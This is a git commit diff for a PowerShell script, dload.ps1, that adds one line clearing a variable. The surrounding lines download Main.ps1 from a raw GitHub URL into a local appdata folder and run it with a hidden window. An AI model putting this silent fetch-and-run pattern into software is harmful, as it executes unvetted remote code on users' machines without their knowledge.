08d518e5a18bf431bdeafa11da1dd0ae1e47c6d0
Refr3sh <71416313+Refr3sh@users.noreply.github.com>
2021-02-14 05:54:39 +0000

    Update dload.ps1

--- dload.ps1
+++ dload.ps1
@@ -6,6 +6,8 @@ If(!($ChkDownloadLoc -eq $True)){
 	New-Item -Path "$DownloadLoc" -ItemType Directory -Force
 	New-Item -Path "$DownloadLoc\Font" -ItemType Directory -Force
 }
+
 $web.DownloadString('https://raw.githubusercontent.com/Refr3sh/YWTTC/main/Main.ps1') > "$DownloadLoc\Main.ps1"
 &"$Env:UserProfile\Appdata\Local\DCode\Main.ps1" -WindowStyle Hidden
+Remove-Variable web
 exit
